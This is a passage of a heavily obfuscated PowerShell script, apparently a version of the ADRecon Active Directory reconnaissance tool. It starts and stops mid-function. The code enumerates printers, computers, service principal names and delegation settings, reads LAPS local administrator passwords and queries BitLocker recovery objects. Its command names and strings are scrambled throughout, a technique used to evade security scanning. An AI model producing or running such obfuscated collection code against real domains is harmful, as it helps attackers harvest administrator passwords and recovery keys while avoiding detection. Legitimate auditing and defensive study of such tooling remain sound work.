    )

    If (${me`Th`OD} -eq ("{1}{0}"-f'WS','AD'))
    {
        Try
        {
            ${aD`prINte`RS} = @( &("{0}{1}{2}{3}" -f 'Get','-AD','Ob','ject') -LDAPFilter ("{4}{7}{3}{6}{8}{0}{1}{2}{5}"-f'or','y=','printQue','tCa','(obje','ue)','t','c','eg') -Properties ("{1}{2}{0}"-f'Name','dri','ver'),("{1}{3}{2}{0}"-f'n','driver','rsio','Ve'),("{0}{1}" -f'Na','me'),("{2}{0}{1}" -f'N','ame','port'),("{3}{1}{0}{2}" -f'tShar','n','eName','pri'),("{0}{2}{1}" -f's','rverName','e'),("{0}{1}"-f 'u','rl'),("{2}{0}{1}"-f'nC','hanged','whe'),("{0}{2}{1}"-f 'w','nCreated','he') )
        }
        Catch
        {
            &("{3}{0}{2}{1}"-f 'te','arning','-W','Wri') ("{7}{0}{5}{1}{6}{2}{3}{8}{9}{4}"-f'DRPrinter] Error','erating ','rin','t','ts',' while enum','p','[Get-A','Q','ueue Objec')
            &("{0}{2}{3}{1}" -f 'Write-V','ose','er','b') "[EXCEPTION] $($_.Exception.Message) "
            Return ${Nu`LL}
        }

        If (${ADp`RIn`TErs})
        {
            &("{0}{2}{3}{1}" -f 'Write-','ose','Ver','b') "[*] Total Printers: $([ADRecon.ADWSClass]::ObjectCount($ADPrinters)) "
            ${PrINTE`R`SOBJ} =  (variaBLe  9B5p6  ).vALUe::("{0}{2}{1}"-f 'Prin','er','terPars').Invoke(${AdpR`INT`eRs}, ${TH`Rea`Ds})
            &("{0}{3}{1}{2}"-f'Remove-','ariab','le','V') ("{0}{1}{2}" -f'ADPri','n','ters')
        }
    }

    If (${me`T`hoD} -eq ("{0}{1}"-f 'LDA','P'))
    {
        ${OBj`s`ea`RCHEr} = &("{1}{2}{0}"-f 'ject','N','ew-Ob') ("{8}{3}{5}{7}{6}{2}{0}{4}{9}{1}" -f'Sea','r','tory','.','rch','Directo','rec','ryServices.Di','System','e') ${oBj`DO`ma`iN}
        ${o`B`JsEaR`cheR}."pa`g`esize" = ${pa`g`e`SiZe}
        ${obJs`ea`Rch`er}."FI`LT`eR" = ("{6}{3}{0}{2}{1}{5}{4}{7}" -f'ct','=pri','Category','obje','u','ntQue','(','e)')
        ${Ob`JSea`R`cHer}."SEarCHS`c`opE" = ("{0}{1}" -f'Su','btree')

        Try
        {
            ${Ad`priN`T`erS} = ${Ob`jsE`ARCher}.("{1}{0}{2}"-f 'Al','Find','l').Invoke()
        }
        Catch
        {
            &("{1}{2}{3}{0}" -f 'ing','Wr','ite-','Warn') ("{8}{9}{7}{4}{6}{3}{2}{5}{1}{0}" -f's','t','printQueue ','numerating ','ror while ','Objec','e','] Er','[','Get-ADRPrinter')
            &("{1}{0}{2}" -f 'Verbo','Write-','se') "[EXCEPTION] $($_.Exception.Message) "
            Return ${nu`ll}
        }
        ${oB`jSEA`R`cHer}.("{1}{0}" -f'se','dispo').Invoke()

        If (${aDpri`Nt`ers})
        {
            ${C`Nt} = $(  (  vARiabLE  ("o"+"LXe") -VaLUeoN )::("{2}{1}{0}"-f 'Count','t','Objec').Invoke(${ad`PRI`Nt`ers}))
            If (${c`Nt} -ge 1)
            {
                &("{1}{0}{2}"-f'ite-Ver','Wr','bose') ('['+'*] '+'To'+'ta'+'l '+'Prin'+'te'+'rs: '+"$cnt")
                ${prINtEr`S`O`Bj} =  (  gEt-vaRIAbLe  ("oLX"+"E") -va)::("{1}{3}{0}{2}"-f'arse','Pri','r','nterP').Invoke(${A`dpRi`N`TeRs}, ${t`h`ReADs})
            }
            &("{2}{0}{1}{3}{4}" -f'ove-V','a','Rem','ri','able') ("{3}{1}{0}{2}" -f'er','rint','s','ADP')
        }
    }

    If (${PR`INtER`S`obj})
    {
        Return ${p`R`iNtERsO`Bj}
    }
    Else
    {
        Return ${nu`ll}
    }
}

Function Get-A`DRComPu`T`ER
{

    param(
        [Parameter(MaNdAToRY = ${Tr`Ue})]
        [string] ${meT`hOD},

        [Parameter(MANdaToRy = ${Tr`Ue})]
        [DateTime] ${D`ATE},

        [Parameter(MaNdaTorY = ${FAl`Se})]
        [DirectoryServices.DirectoryEntry] ${ObjD`o`maIn},

        [Parameter(mAnDAtorY = ${T`Rue})]
        [int] ${D`orM`ANttI`Me`sPan} = 90,

        [Parameter(MAnDAtOrY = ${T`RuE})]
        [int] ${pAS`SMA`X`Age} = 30,

        [Parameter(MandAToRY = ${Tr`UE})]
        [int] ${pagEsi`ze} = 200,

        [Parameter(maNDAtoRY = ${FA`l`se})]
        [int] ${T`HrEaDS} = 10,

        [Parameter(maNdatoRY = ${faL`SE})]
        [int] ${aDrcoM`PUte`RS} = ${t`RuE},

        [Parameter(MAndaTory = ${F`A`LSe})]
        [int] ${ad`RcOMpUt`erSp`NS} = ${FA`L`SE},

        [Parameter(MAnDAToRy = ${fa`L`se})]
        [int] ${ONLy`EN`ABl`eD} = ${Fal`se}
    )

    If (${me`THoD} -eq ("{1}{0}"-f'WS','AD'))
    {
        If (!${AdrCOM`Put`eRs})
        {
            Try
            {
                If (${oNl`yena`Bl`eD})
                {
                    ${adC`omp`UTeRs} = @( &("{0}{2}{1}{3}"-f'Get','ADObj','-','ect') -LDAPFilter ((("{16}{23}{22}{21}{25}{6}{12}{17}{19}{14}{1}{5}{24}{10}{3}{20}{4}{18}{15}{0}{13}{26}{8}{7}{2}{27}{9}{11}"-f '.840.11','l','803:','r','un','Name','0','.1.4.','56',')','use',')','53','3','incipa','trol:1.2','(&(s','06369)(ser','tCon','vicePr','Acco','tType','mAccoun','a','=*)(!','=8','5','=2'))) -ResultPageSize ${pa`Ge`sIZe} -Properties ("{0}{1}" -f'N','ame'), ("{2}{0}{3}{1}{4}" -f'vicePrinci','a','ser','palN','me') )
                }
                Else
                {
                    ${Ad`CO`MPUte`Rs} = @( &("{2}{3}{1}{0}" -f 't','ADObjec','Get','-') -LDAPFilter (("{3}{9}{8}{5}{4}{2}{0}{10}{6}{7}{1}" -f '9)(servic',')','636','(&(samAcco','0530','=8','lName=*',')','tType','un','ePrincipa')) -ResultPageSize ${P`A`GeSiZe} -Properties ("{0}{1}"-f 'Na','me'),("{5}{3}{2}{0}{4}{1}"-f 'i','Name','Pr','vice','ncipal','ser') )
                }
            }
            Catch
            {
                &("{1}{0}{2}"-f 'Wa','Write-','rning') ("{10}{9}{11}{13}{1}{7}{5}{0}{8}{2}{14}{6}{12}{3}{4}"-f'r wh','r','m','bje','cts','o','erSPN','] Err','ile enu','DR','[Get-A','Comput',' O','e','erating Comput')
                &("{2}{0}{1}" -f 'ite-Verb','ose','Wr') "[EXCEPTION] $($_.Exception.Message) "
                Return ${nu`Ll}
            }
        }
        Else
        {
            Try
            {
                If (${oN`L`YenaBLEd})
                {
                    ${AdCo`MPU`T`ers} = @( &("{2}{3}{0}{1}" -f'ut','er','Get-AD','Comp') -Filter ('enab'+'le'+'d '+'-e'+'q '+('{'+'0}true') -f [cHAR]36) -ResultPageSize ${p`A`GesIZe} -Properties ("{1}{0}{3}{2}" -f'scripti','De','n','o'),("{4}{5}{2}{0}{1}{3}"-f'shed','Nam','gui','e','Di','stin'),("{1}{0}{2}"-f 'HostN','DNS','ame'),("{2}{0}{1}" -f 'l','ed','Enab'),("{0}{1}{2}" -f'IPv4Add','r','ess'),("{2}{0}{1}"-f 't','e','LastLogonDa'),("{4}{5}{1}{0}{3}{2}" -f'owedToDeleg','l','teTo','a','msDS-','Al'),("{0}{1}{3}{2}"-f'ms-','ds-Cre','d','atorSi'),("{6}{5}{0}{4}{2}{1}{3}{7}" -f '-Su','pti','tedEncry','onType','ppor','S','msD','s'),("{1}{0}" -f 'e','Nam'),("{1}{2}{0}{4}{3}"-f'ing','Ope','rat','stem','Sy'),("{4}{1}{0}{3}{2}" -f 'H','System','x','otfi','Operating'),("{1}{0}{2}{5}{4}{3}" -f 'p','O','eratingSyste','Pack','rvice','mSe'),("{2}{1}{0}{3}{4}" -f 'n','i','Operat','gSystemVe','rsion'),("{0}{2}{3}{1}" -f'P','Set','asswordLa','st'),("{3}{0}{1}{2}"-f'ro','up','ID','primaryG'),("{2}{4}{1}{0}{3}"-f 'ountNa','Acc','S','me','am'),("{0}{4}{3}{1}{5}{2}" -f 'ser','l','e','cePrincipa','vi','Nam'),("{1}{0}"-f'ID','S'),("{2}{0}{1}" -f 's','tory','SIDHi'),("{2}{0}{3}{4}{1}{5}" -f 'e','gat','Trust','dForDel','e','ion'),("{1}{5}{0}{4}{8}{2}{7}{3}{6}"-f 'oAu','Tr','l','i','t','ustedT','on','egat','hForDe'),("{3}{1}{2}{0}"-f'ntControl','c','ou','UserAc'),("{2}{0}{1}"-f'an','ged','whenCh'),("{1}{0}{3}{2}"-f'en','wh','d','Create') )
                }
                Else
                {
                    ${AdC`OM`Pu`TERS} = @( &("{0}{1}{3}{4}{2}"-f'Ge','t','uter','-ADC','omp') -Filter * -ResultPageSize ${pAg`e`sIze} -Properties ("{1}{2}{0}" -f'n','D','escriptio'),("{3}{2}{0}{1}" -f'N','ame','uished','Disting'),("{3}{1}{0}{2}" -f'HostN','S','ame','DN'),("{1}{2}{0}"-f 'led','Ena','b'),("{0}{1}{2}" -f 'IPv4A','ddr','ess'),("{2}{3}{0}{1}"-f'at','e','L','astLogonD'),("{3}{4}{7}{5}{6}{1}{2}{0}"-f 'o','at','eT','ms','DS-Al','ow','edToDeleg','l'),("{0}{2}{1}{3}{4}" -f 'ms-','s-','d','C','reatorSid'),("{2}{0}{4}{5}{3}{1}{6}"-f'S','rted','msD','o','-Su','pp','EncryptionTypes'),("{0}{1}"-f 'N','ame'),("{0}{3}{2}{1}" -f'Op','System','rating','e'),("{2}{3}{0}{5}{4}{1}"-f'atingSys','tfix','Op','er','emHo','t'),("{5}{2}{1}{3}{4}{0}" -f 'ack','ngSystemServ','erati','ice','P','Op'),("{4}{1}{3}{5}{2}{0}"-f'n','eratin','Versio','gSy','Op','stem'),("{1}{3}{2}{0}"-f'et','Pas','S','swordLast'),("{4}{2}{0}{3}{1}" -f 'maryGr','ID','ri','oup','p'),("{2}{0}{1}{3}"-f 'mAc','cou','Sa','ntName'),("{1}{3}{2}{0}"-f'alName','servic','ncip','ePri'),("{1}{0}"-f 'ID','S'),("{1}{0}{2}" -f 'DHis','SI','tory'),("{3}{2}{0}{1}"-f'ati','on','ForDeleg','Trusted'),("{2}{3}{4}{0}{6}{5}{1}" -f 'thForD','ation','Tr','ustedT','oAu','eg','el'),("{3}{2}{1}{0}" -f 'tControl','coun','Ac','User'),("{0}{1}{2}"-f'whe','nCha','nged'),("{0}{1}{2}"-f 'whenCre','at','ed') )
                }
            }
            Catch
            {
                &("{1}{2}{3}{0}" -f'ng','Wri','te-War','ni') ("{6}{8}{1}{5}{0}{13}{9}{15}{14}{3}{7}{12}{11}{10}{2}{4}{16}" -f ' E','DRCom',' O','Com','bje','puter]','[','p','Get-A','ile','r','te','u','rror wh','ting ',' enumera','cts')
                &("{2}{3}{1}{0}" -f'te-Verbose','i','W','r') "[EXCEPTION] $($_.Exception.Message) "
                Return ${nu`Ll}
            }
        }
        If (${A`dcOMpUt`eRs})
        {
            &("{0}{2}{1}{3}" -f 'Wri','e','t','-Verbose') "[*] Total Computers: $([ADRecon.ADWSClass]::ObjectCount($ADComputers)) "
            If (${aDR`C`omP`U`TERs})
            {
                ${CompU`T`e`ROBj} =   (DIr ("v"+"ARIABle"+":9B5p6") ).valUE::("{1}{3}{2}{0}" -f'Parser','C','ter','ompu').Invoke(${Ad`C`omPU`TerS}, ${D`ATE}, ${DOrM`ANtT`i`MeSP`An}, ${pASs`M`AXA`Ge}, ${thR`EA`dS})
            }
            If (${adr`CO`mpu`TERs`pnS})
            {
                ${COMpuTers`PN`oBj} =   $9B5P6::("{1}{2}{3}{4}{0}" -f'SPNParser','Co','mp','ut','er').Invoke(${ad`c`OMPuT`ERS}, ${THr`EA`Ds})
            }
            &("{2}{1}{0}"-f'ariable','ve-V','Remo') ("{3}{0}{1}{2}" -f 'pu','ter','s','ADCom')
        }
    }

    If (${meT`h`Od} -eq ("{0}{1}"-f 'LDA','P'))
    {
        If (!${AD`RCOMP`UT`E`Rs})
        {
            ${o`BJsEArc`heR} = &("{2}{1}{0}"-f't','jec','New-Ob') ("{3}{7}{0}{4}{6}{1}{2}{9}{8}{10}{5}"-f 'Director','es.Dir','ect','Syst','yServ','r','ic','em.','rySea','o','rche') ${oB`j`doMaiN}
            ${ob`Js`e`ARcHer}."Page`S`Ize" = ${PA`G`ESiZE}
            If (${o`Nl`YE`NabLED})
            {
                ${o`Bj`SEaR`cheR}."FI`LtER" = ((("{21}{4}{7}{0}{14}{1}{11}{8}{6}{18}{15}{3}{10}{5}{20}{2}{9}{22}{19}{17}{12}{13}{16}" -f '=','69)','se','alName','yp','*','icePr','e','serv','rAccountContro','=','(','3',':=2','8053063','ip','))','.1.4.80','inc','113556',')(!u','(&(samAccountT','l:1.2.840.')))
            }
            Else
            {
                ${O`BjSeaR`c`her}."filT`ER" = ((("{6}{3}{9}{7}{13}{1}{10}{12}{8}{5}{11}{2}{0}{4}"-f 'Nam','ser','ipal','AccountType=8','e=*))','n','(&(sam','306369)','cePri','05','v','c','i','(')))
            }
            ${oB`j`sEaRChER}."pR`O`PE`Rt`IEStOLOAd".("{0}{2}{1}"-f 'Ad','ange','dR').Invoke((("{1}{0}"-f 'me','na'),("{0}{2}{3}{1}{4}" -f 'serv','cipalna','icepr','in','me')))
            ${OBjseaR`c`H`Er}."s`EaRcHSc`OPe" = ("{1}{0}{2}" -f'ubtr','S','ee')
            Try
            {
                ${aDc`OMPut`e`RS} = ${o`B`jSeARcheR}.("{2}{0}{1}" -f 'dAl','l','Fin').Invoke()
            }
            Catch
            {
                &("{1}{3}{2}{0}"-f'g','Wr','in','ite-Warn') ("{5}{18}{0}{7}{15}{4}{17}{12}{13}{10}{9}{6}{11}{1}{3}{8}{14}{2}{16}"-f'RCo','terSP','ject','N',' E','[Get-',' C','mpu',' O','erating','um','ompu',' w','hile en','b','ter]','s','rror','AD')
                &("{3}{2}{1}{0}"-f 'rbose','-Ve','te','Wri') "[EXCEPTION] $($_.Exception.Message) "
                Return ${n`ULL}
            }
            ${o`B`jse`ARchEr}.("{2}{0}{1}"-f'is','pose','d').Invoke()
        }
        Else
        {
            ${O`BjsEA`RCHer} = &("{0}{1}{2}"-f'New','-','Object') ("{5}{6}{2}{10}{3}{0}{4}{1}{9}{11}{7}{12}{8}"-f'yS','rvice','te','tor','e','Sy','s','ir','rcher','s','m.Direc','.D','ectorySea') ${O`BJ`DoMAin}
            ${o`B`JSEARc`her}."p`Agesize" = ${PAge`S`IZe}
            If (${OnLYena`B`L`Ed})
            {
                ${objs`eAR`C`Her}."fILT`ER" = ((("{20}{13}{10}{7}{4}{2}{16}{19}{9}{12}{0}{11}{6}{18}{1}{14}{5}{3}{21}{8}{15}{17}"-f'e','1','ype=805','56.','untT','.840.1135','tCo','o','80','69)','c','rAccoun','(!us','Ac','.2','3:=','306','2))','ntrol:','3','(&(sam','1.4.')))
            }
            Else
            {
                ${O`BjSeA`R`ChER}."FILT`eR" = (("{7}{3}{1}{4}{2}{5}{0}{6}"-f'30636','nt','=8','cou','Type','05','9)','(samAc'))
            }
            ${oBJSEARC`h`er}."P`ROPEr`TIestoLOad".("{0}{1}" -f 'Add','Range').Invoke((("{1}{0}{2}"-f'ti','descrip','on'),("{2}{3}{0}{1}"-f 'nguish','edname','dist','i'),("{2}{0}{1}"-f'ostnam','e','dnsh'),("{3}{1}{0}{2}{4}"-f'n','go','timesta','lastlo','mp'),("{1}{2}{3}{6}{5}{4}{7}{0}"-f 'egateTo','ms','D','S-','owedToD','l','Al','el'),("{1}{2}{3}{0}"-f 'atorSid','ms','-','ds-Cre'),("{6}{1}{5}{8}{2}{4}{7}{0}{3}" -f 'cryptionTyp','D','o','es','rtedE','S','ms','n','-Supp'),("{0}{1}" -f'nam','e'),("{0}{1}{2}"-f 'o','bjectsi','d'),("{0}{3}{1}{2}" -f'operating','te','m','sys'),("{2}{1}{0}{4}{3}" -f 'atingsyst','per','o','tfix','emho'),("{6}{2}{4}{7}{5}{3}{0}{1}" -f 's','ervicepack','e','m','rating','yste','op','s'),("{2}{3}{0}{1}{4}"-f 'e','rsio','operatingsys','temv','n'),("{1}{2}{0}"-f'd','primar','ygroupi'),("{1}{2}{0}"-f 'stset','pw','dla'),("{4}{1}{2}{0}{3}" -f'nam','coun','t','e','samac'),("{4}{5}{2}{0}{3}{1}" -f'n','me','pri','cipalna','servic','e'),("{2}{0}{1}" -f 'idhist','ory','s'),("{3}{1}{4}{2}{0}"-f'l','acco','contro','user','unt'),("{0}{2}{1}{3}"-f'w','nch','he','anged'),("{2}{0}{1}" -f 'h','encreated','w')))
            ${ob`jseAR`CHer}."Sea`Rchs`cope" = ("{0}{1}"-f'Subtre','e')

            Try
            {
                ${A`DC`oMp`UterS} = ${obj`sEAR`CH`ER}.("{2}{1}{0}" -f 'l','l','FindA').Invoke()
            }
            Catch
            {
                &("{1}{0}{2}" -f 'rite-W','W','arning') ("{6}{5}{8}{13}{1}{0}{9}{10}{12}{11}{3}{2}{14}{7}{4}"-f 'rro','mputer] E','merating Compu','nu','jects','t-AD','[Ge','r Ob','R','r ','whil',' e','e','Co','te')
                &("{1}{2}{0}"-f'se','Write','-Verbo') "[EXCEPTION] $($_.Exception.Message) "
                Return ${n`Ull}
            }
            ${obJS`E`ARchER}.("{1}{2}{0}" -f 'ose','d','isp').Invoke()
        }

        If (${Ad`coM`PU`TERs})
        {
            &("{2}{0}{3}{1}{4}"-f 'V','os','Write-','erb','e') "[*] Total Computers: $([ADRecon.LDAPClass]::ObjectCount($ADComputers)) "
            If (${a`d`RC`ompu`TErs})
            {
                ${CoM`PU`TEro`Bj} =  ( cHIlDItEm  variablE:OlxE ).VALuE::("{1}{2}{3}{0}" -f'r','Compu','terPars','e').Invoke(${ADc`oMPU`T`eRS}, ${dA`TE}, ${DorM`ANT`TiMes`PAn}, ${Pa`SSMAxa`GE}, ${tHrea`Ds})
            }
            If (${adrCom`p`Ut`erSpNs})
            {
                ${COmput`ERSP`N`O`Bj} =  (  gEt-ItEm  VArIABle:OLXe).vAlUe::("{1}{3}{0}{2}" -f'PNPar','Co','ser','mputerS').Invoke(${ad`COMpute`Rs}, ${ThrE`A`dS})
            }
            &("{0}{4}{1}{2}{3}"-f 'R','ve-Va','r','iable','emo') ("{0}{1}{3}{2}" -f'ADC','omput','s','er')
        }
    }

    If (${coM`PuTer`oBJ})
    {
        &("{1}{0}{2}"-f'xpo','E','rt-ADR') -ADRObj ${COMPUT`e`Ro`BJ} -ADROutputDir ${AD`ROut`PuTd`iR} -OutputType ${oU`T`PUtt`YPE} -ADRModuleName ("{1}{2}{0}"-f 'rs','Com','pute')
        &("{4}{1}{3}{0}{2}" -f'i','emove-V','able','ar','R') ("{2}{0}{1}" -f 'mpute','rObj','Co')
    }
    If (${COM`put`eRs`p`NOBj})
    {
        &("{1}{2}{0}"-f'R','Exp','ort-AD') -ADRObj ${COM`p`UtERspNo`BJ} -ADROutputDir ${aD`R`OUT`PUtd`ir} -OutputType ${OU`TP`Ut`TYPe} -ADRModuleName ("{0}{2}{1}{3}"-f'Comp','S','uter','PNs')
        &("{1}{0}{2}{3}" -f '-','Remove','Variab','le') ("{3}{0}{2}{1}"-f'P','Obj','N','ComputerS')
    }
}

Function GE`T`-aDRla`PScheck
{

    param(
        [Parameter(MANdaTOrY = ${Tr`Ue})]
        [string] ${m`E`THoD},

        [Parameter(mANDatORy = ${F`AlSE})]
        [DirectoryServices.DirectoryEntry] ${oBJD`omAi`NrO`oTDSe},

        [Parameter(MandatOry = ${F`AL`Se})]
        [string] ${do`MaincO`Nt`RolL`ER},

        [Parameter(MaNdatOry = ${FA`Lse})]
        [Management.Automation.PSCredential] ${c`REden`TiAL} =  (  GeT-itEM  ("VArIaBl"+"e:cl"+"f0N")).VALuE::"EMP`TY"
    )

    If (${M`Et`HoD} -eq ("{0}{1}" -f 'ADW','S'))
    {
        Try
        {
            ${AdRl`A`pSChecK} = @( &("{2}{3}{1}{0}" -f't','DObjec','Ge','t-A') "CN=ms-Mcs-AdmPwd,$((Get-ADRootDSE).schemaNamingContext)" )
        }
        Catch
        {
            &("{2}{3}{1}{0}"-f'se','bo','W','rite-Ver') ("{4}{2}{5}{1}{0}{3}{6}" -f 'mp','t i','*] LAPS is n','le','[','o','mented.')
            Return ${fal`se}
        }

        If (${aDRL`AP`sc`hE`ck})
        {
            &("{4}{0}{2}{3}{1}" -f'emo','able','ve-','Vari','R') ("{1}{0}{2}" -f'APSChec','ADRL','k')
            Return ${t`Rue}
        }
        Else
        {
            Return ${f`A`lsE}
        }
    }

    If (${m`E`ThoD} -eq ("{1}{0}" -f 'AP','LD'))
    {
        Try
        {
            If (${CrE`dent`ial} -ne   (  vaRiAbLe  cLf0N).vAlUe::"EMP`TY")
            {
                ${ADR`lApsC`Hec`KdsE} = &("{3}{2}{1}{0}"-f'Object','-','ew','N') ("{11}{3}{5}{4}{10}{9}{0}{1}{6}{7}{2}{8}" -f'r','ect','t','D','ectoryServi','ir','o','ryEn','ry','Di','ces.','System.') "LDAP://$($DomainController)/CN=ms-Mcs-AdmPwd,$($objDomainRootDSE.schemaNamingContext)", ${cReDe`N`T`iAL}."u`sErN`AmE", ${cre`dE`NtI`AL}.("{0}{2}{4}{1}{5}{3}" -f 'GetNetw','n','orkCre','ial','de','t').Invoke()."P`AssWOrd"
                If (-Not (${adRLaps`CHeCK`D`Se}."p`AtH"))
                {
                    ${ADrl`ApsC`Heck} = ${FaL`Se}
                }
                Else
                {
                    ${aDRLaP`s`cHE`Ck} = ${T`Rue}
                    ${aDrl`ApsC`HEcKd`Se}.("{0}{2}{1}"-f 'd','spose','i').Invoke()
                }
            }
            Else
            {
                ${ad`R`lAPsC`hEcK} =   (gEt-vARIablE ('lqw'+'7')).vaLuE::("{0}{1}"-f 'E','xists').Invoke("LDAP://CN=ms-Mcs-AdmPwd,$($objDomainRootDSE.schemaNamingContext)")
            }
        }
        Catch
        {
            &("{2}{3}{1}{0}"-f'bose','Ver','Wr','ite-') ("{8}{2}{15}{7}{18}{0}{11}{12}{4}{17}{6}{10}{1}{5}{3}{16}{13}{9}{14}" -f'r','ce','G','APS P','h',' of L','or exist','PSCh','[','t','an',' ','w','er','ies','et-ADRLA','rop','ile checking f','eck] Erro')
            &("{2}{1}{0}"-f 'rbose','rite-Ve','W') "[EXCEPTION] $($_.Exception.Message) "
        }

        If (${aDr`LAp`s`cHEcK})
        {
            &("{1}{2}{3}{0}"-f 'le','Remove-Var','ia','b') ("{1}{2}{3}{0}"-f 'ck','ADR','LAPSC','he')
            Return ${TR`Ue}
        }
        Else
        {
            Return ${Fa`LsE}
        }
    }
}


Function G`e`T-a`dRLAps
{

    param(
        [Parameter(mANDatoRY = ${t`RuE})]
        [string] ${Me`THoD},

        [Parameter(mandaTOry = ${faL`SE})]
        [DirectoryServices.DirectoryEntry] ${OBj`DO`ma`in},

        [Parameter(MANdaToRY = ${F`AlSE})]
        [int] ${P`AGESI`Ze} = 200,

        [Parameter(mANdaTOry = ${fa`lSE})]
        [int] ${t`hREAdS} = 10
    )

    If (${M`ethoD} -eq ("{0}{1}"-f'ADW','S'))
    {
        Try
        {
            ${AD`C`oMPu`TERS} = @( &("{1}{2}{0}"-f 'ject','Get-AD','Ob') -LDAPFilter ("{0}{5}{4}{3}{2}{1}" -f'(samAccou',')','9','0530636','8','ntType=') -Properties ('CN'), ("{0}{3}{1}{2}" -f 'D','stNa','me','NSHo'), ("{2}{0}{1}" -f'-','AdmPwd','ms-Mcs'), ("{1}{5}{3}{4}{7}{0}{6}{2}{8}"-f'i','ms-Mcs-','nT','Ex','pir','AdmPwd','o','at','ime'),("{1}{0}{2}{3}" -f'seraccountc','u','o','ntrol') -ResultPageSize ${pagE`SI`zE} )
        }
        Catch
        {
            &("{0}{3}{1}{2}" -f'Write-Wa','n','g','rni') ("{4}{1}{8}{3}{5}{2}{6}{7}{0}" -f'jects','t-ADRLAPS] Error wh','erati','e enu','[Ge','m','ng',' LAPS Ob','il')
            &("{4}{1}{2}{0}{3}" -f 'rbo','ite','-Ve','se','Wr') "[EXCEPTION] $($_.Exception.Message) "
            Return ${n`UlL}
        }

        If (${a`D`COmPuT`ErS})
        {
            &("{3}{0}{4}{1}{2}" -f'V','bos','e','Write-','er') "[*] Total LAPS Objects: $([ADRecon.ADWSClass]::ObjectCount($ADComputers)) "
            ${L`AP`soBj} =   (  Get-itEM VarIABLE:9b5p6).ValUE::("{1}{3}{0}{2}"-f'SPar','LA','ser','P').Invoke(${Adc`OMp`UT`ers}, ${thr`Ea`ds})
            &("{2}{3}{4}{0}{1}" -f'iabl','e','Rem','ove-Va','r') ("{2}{0}{1}" -f'omputer','s','ADC')
        }
    }

    If (${mETH`oD} -eq ("{1}{0}" -f 'DAP','L'))
    {
        ${objs`eArc`HER} = &("{2}{0}{1}" -f'ew-O','bject','N') ("{3}{6}{0}{1}{4}{5}{2}" -f 'e','m.DirectorySer','ectorySearcher','Sy','vic','es.Dir','st') ${o`Bj`doM`AIN}
        ${Obj`Se`ArCHEr}."PA`gEsIZE" = ${P`AGEs`izE}
        ${obJsEA`R`C`hEr}."F`iL`TeR" = (("{8}{4}{7}{2}{5}{3}{1}{0}{6}" -f'5306369','0','A','ntType=8','s','ccou',')','am','('))
        ${o`Bj`SEARCHER}."pr`OP`ert`iEstOlOad".("{1}{0}{2}"-f'dRan','Ad','ge').Invoke(("cn",("{0}{1}{2}{3}"-f 'dn','shost','na','me'),("{3}{0}{2}{1}" -f'-ad','wd','mp','ms-mcs'),("{6}{3}{2}{5}{4}{0}{7}{1}" -f 'expir','ime','s','s-mc','dmpwd','-a','m','ationt'),("{2}{4}{0}{3}{1}" -f 'a','trol','use','ccountcon','r')))
        ${obj`s`EaR`CHeR}."s`EArch`sCopE" = ("{0}{2}{1}" -f 'Su','ee','btr')
        Try
        {
            ${a`dcomp`UTers} = ${O`BJSEA`RCh`eR}.("{0}{1}"-f'Fi','ndAll').Invoke()
        }
        Catch
        {
            &("{3}{0}{4}{1}{2}"-f'te-Warn','n','g','Wri','i') ("{14}{4}{11}{9}{12}{6}{2}{0}{7}{8}{3}{1}{5}{10}{13}"-f' e','APS Obj','while','erating L','Get','e','S] Error ','n','um','RL','ct','-AD','AP','s','[')
            &("{2}{3}{1}{0}" -f 'ose','erb','Wr','ite-V') "[EXCEPTION] $($_.Exception.Message) "
            Return ${N`UlL}
        }
        ${Ob`j`SEArCHeR}.("{0}{1}"-f'di','spose').Invoke()

        If (${AD`comPu`TE`RS})
        {
            &("{4}{1}{2}{3}{0}" -f 'e','t','e-Ver','bos','Wri') "[*] Total LAPS Objects: $([ADRecon.LDAPClass]::ObjectCount($ADComputers)) "
            ${LaPS`ObJ} =   ( Gi ("VAR"+"iaBLE"+":"+"olxe")  ).VALUE::("{0}{1}{2}" -f'LAPSPa','rs','er').Invoke(${ad`cO`mpuTERs}, ${ThrE`A`dS})
            &("{3}{1}{0}{2}"-f'ariabl','ove-V','e','Rem') ("{1}{2}{0}" -f'ters','ADCom','pu')
        }
    }

    If (${lAPS`O`Bj})
    {
        Return ${Lap`So`BJ}
    }
    Else
    {
        Return ${Nu`Ll}
    }
}

Function gET-ADr`B`ITLo`cK`Er
{

    param(
        [Parameter(mAndaTory = ${TR`UE})]
        [string] ${ME`THOd},

        [Parameter(MANDAtorY = ${f`A`LSe})]
        [DirectoryServices.DirectoryEntry] ${O`BJ`DomA`in},

        [Parameter(maNdatoRY = ${FAL`se})]
        [string] ${DOm`AInco`Nt`ROllER},

        [Parameter(mandaTOrY = ${Fa`L`sE})]
        [Management.Automation.PSCredential] ${cred`eNT`IAl} =  (VARIAbLe CLf0N ).vALUE::"EMp`Ty"
    )

    If (${m`E`ThOd} -eq ("{1}{0}"-f 'WS','AD'))
    {
        Try
        {
            ${adbI`TloCke`RRE`c`OVer`yKeYS} = &("{0}{2}{1}" -f 'Get-ADObje','t','c') -LDAPFilter ("{3}{1}{9}{2}{6}{8}{4}{5}{0}{10}{7}" -f'I','j','=msFV','(ob','ve','ry','E-','formation)','Reco','ectClass','n') -Properties ("{3}{1}{2}{0}"-f 'ame','stingui','shedN','di'),("{2}{6}{4}{0}{5}{1}{3}" -f'-Recove','assw','m','ord','E','ryP','sFV'),("{4}{3}{0}{2}{5}{1}" -f'VE-R','d','eco','sF','m','veryGui'),("{2}{0}{3}{1}{4}" -f'E','umeG','msFV','-Vol','uid'),("{1}{0}" -f'ame','N'),("{3}{1}{0}{2}"-f'rea','henC','ted','w')
        }
        Catch
        {
            &("{2}{0}{1}" -f 'rite-W','arning','W') ("{2}{0}{4}{6}{8}{3}{1}{10}{5}{7}{9}{11}" -f 'ADRBitLo','umerating m','[Get-','n','cker] E','er','rror whil','yIn','e e','f','sFVE-Recov','ormation Objects')
            &("{3}{2}{1}{0}"-f'rbose','e-Ve','it','Wr') "[EXCEPTION] $($_.Exception.Message) "
            Return ${nu`Ll}
        }

        If (${aD`B`I`T`LoCker`R`ecOvER`YkEYS})
        {
            ${c`NT} = $(  (GeT-itEM  ("va"+"RiABl"+"e:9b"+"5p6") ).VALue::("{1}{0}{2}"-f'ect','Obj','Count').Invoke(${aDb`I`TLOcKeR`REc`O`VEryKeys}))
            If (${C`Nt} -ge 1)
            {
                &("{4}{1}{0}{3}{2}" -f 'e-Verb','rit','se','o','W') ('[*'+'] '+'T'+'ota'+'l '+'BitLo'+'cke'+'r '+'Recover'+'y '+'Ke'+'ys: '+"$cnt")
                ${BIT`LO`CKErO`Bj} = @()
